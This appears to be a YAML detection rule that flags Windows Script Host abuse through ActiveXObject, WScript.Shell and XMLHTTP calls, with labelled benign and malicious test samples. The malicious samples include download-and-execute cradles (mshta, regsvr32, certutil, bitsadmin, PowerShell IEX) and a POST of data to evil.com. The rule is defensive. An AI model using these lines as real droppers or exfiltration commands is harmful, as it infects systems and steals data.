name: medium-27-wsh-javascript
severity: medium
description: >
  Detects Windows Script Host executing JavaScript or VBScript. Often used in phishing campaigns.

pattern: |
  (?i)(?:new\s+ActiveXObject|WScript\.CreateObject|GetObject)\s*\(\s*['"](?:WScript\.Shell|Shell\.Application|MSXML2\.XMLHTTP(?:\.\d+\.\d+)?|Microsoft\.XMLHTTP|Scripting\.FileSystemObject|ADODB\.Stream|WScript\.Network|Scripting\.Dictionary)['"]|(?:\.Run|\.Exec|\.Open|\.ShellExecute)\s*\(\s*['"](?:cmd|powershell|wscript|cscript|mshta|rundll32|regsvr32)|(?:\.Send|\.ResponseText|\.ResponseBody)|GetObject\s*\(\s*['"](?:script:|winmgmts:)

malicious:
  - 'var shell = new ActiveXObject("WScript.Shell"); shell.Run("cmd /c malicious");'
  - 'new ActiveXObject("Shell.Application")'
  - 'var xhr = new ActiveXObject("MSXML2.XMLHTTP"); xhr.open("GET", "http://evil.com/p.js");'
  - 'WScript.CreateObject("WScript.Shell").Run("powershell -enc payload")'
  - 'var s = new ActiveXObject("WScript.Shell"); s.Exec("curl http://evil.com/mal.exe")'
  - 'new ActiveXObject("Shell.Application").ShellExecute("malware.exe")'
  - 'var shell = new ActiveXObject("WScript.Shell"); shell.Run("mshta http://evil.com/payload.hta")'
  - 'new ActiveXObject("MSXML2.XMLHTTP.6.0")'
  - 'var shell = WScript.CreateObject("WScript.Shell"); shell.Run("cmd.exe /c evil")'
  - 'new ActiveXObject("Shell.Application").ShellExecute("powershell", "-w hidden -c IEX")'
  - 'var http = new ActiveXObject("Microsoft.XMLHTTP"); http.open("GET", "http://attacker.com/backdoor.exe");'
  - 'WScript.CreateObject("WScript.Shell").Exec("wscript malicious.vbs")'
  - 'var shell = new ActiveXObject("WScript.Shell"); shell.Run("cscript dropper.js", 0, false);'
  - 'new ActiveXObject("ADODB.Stream"); stream.Open(); stream.LoadFromFile("http://evil.com/mal.exe");'
  - 'GetObject("script:http://evil.com/payload.sct")'
  - 'var shell = new ActiveXObject("WScript.Shell"); shell.Run("rundll32 evil.dll,EntryPoint");'
  - 'WScript.CreateObject("Shell.Application").ShellExecute("regsvr32", "/s /i http://evil.com/mal.sct scrobj.dll")'
  - 'var xhr = new ActiveXObject("MSXML2.XMLHTTP.3.0"); xhr.Send(); var data = xhr.ResponseText;'
  - 'new ActiveXObject("WScript.Shell").Run("powershell -nop -w hidden -c (New-Object Net.WebClient).DownloadString(''http://evil.com/p.ps1'')|IEX")'
  - 'var fso = new ActiveXObject("Scripting.FileSystemObject"); var shell = new ActiveXObject("WScript.Shell"); shell.Run("cmd /c malicious");'
  - 'WScript.CreateObject("WScript.Shell").Exec("certutil -urlcache -f http://evil.com/malware.exe malware.exe")'
  - 'GetObject("winmgmts:").Get("Win32_Process").Create("cmd /c malicious")'
  - 'var http = new ActiveXObject("MSXML2.XMLHTTP"); http.open("POST", "http://evil.com/exfil"); http.send(data);'
  - 'new ActiveXObject("WScript.Shell").Run("mshta javascript:eval(''malicious code'')")'
  - 'var shell = WScript.CreateObject("Shell.Application"); shell.ShellExecute("powershell.exe", "-encodedcommand SGFja2Vk")'
  - "new ActiveXObject(\"ADODB.Stream\").SaveToFile(\"C:\\\\Temp\\\\malware.exe\");"
  - 'var xhr = new ActiveXObject("Microsoft.XMLHTTP"); xhr.ResponseBody;'
  - 'WScript.CreateObject("WScript.Shell").Run("bitsadmin /transfer job http://evil.com/mal.exe mal.exe && mal.exe")'
  - 'GetObject("script:https://attacker.com/clickfix.sct")'
  - "var shell = new ActiveXObject(\"WScript.Shell\"); shell.Exec(\"cmd.exe /c echo malicious > C:\\\\Temp\\\\evil.bat && C:\\\\Temp\\\\evil.bat\");"

benign:
  - 'console.log("Hello World");'
  - "var x = 10;"
  - "function test() { return true; }"
  - 'document.getElementById("element")'
  - "var array = [1, 2, 3];"
  - "JSON.parse(data)"
  - "var date = new Date();"
  - "Math.random()"
  - 'window.location.href = "https://example.com";'
  - 'localStorage.setItem("key", "value");'
  - 'fetch("https://api.example.com/data")'
  - 'var obj = { name: "test", value: 123 };'
  - 'setTimeout(function() { console.log("timeout"); }, 1000);'
  - 'document.querySelector(".class-name")'
  - "var xhr = new XMLHttpRequest();"
  - "Promise.resolve(data)"
  - "Array.prototype.map()"
  - "String.prototype.split()"
  - 'addEventListener("click", handler);'
  - "JSON.stringify(object)"
